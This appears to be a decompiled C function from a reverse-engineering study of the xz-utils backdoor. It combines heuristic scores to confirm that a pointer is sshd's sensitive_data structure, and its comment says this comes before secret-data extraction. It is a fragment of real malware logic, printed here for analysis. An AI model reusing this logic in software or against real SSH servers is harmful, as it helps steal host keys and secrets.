// /home/kali/xzre-ghidra/xzregh/103D50_sshd_get_sensitive_data_score.c
// Function: sshd_get_sensitive_data_score @ 0x103D50
// Calling convention: __stdcall
// Prototype: int __stdcall sshd_get_sensitive_data_score(void * sensitive_data, elf_info_t * elf, string_references_t * refs)


/*
 * AutoDoc: Combines the scores from `do_child`, `main`, and `demote_sensitive_data` to produce a single confidence value for the candidate pointer. Only when this aggregate passes the threshold does the backdoor store the address and proceed with secret-data extraction.
 */
#include "xzre_types.h"


int sshd_get_sensitive_data_score(void *sensitive_data,elf_info_t *elf,string_references_t *refs)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  if (sensitive_data != (void *)0x0) {
    iVar1 = sshd_get_sensitive_data_score_in_demote_sensitive_data(sensitive_data,elf,refs);
    iVar2 = sshd_get_sensitive_data_score_in_main(sensitive_data,elf,refs);
    iVar3 = sshd_get_sensitive_data_score_in_do_child(sensitive_data,elf,refs);
    return iVar3 + (iVar1 + iVar2) * 2;
  }
  return 0;
}

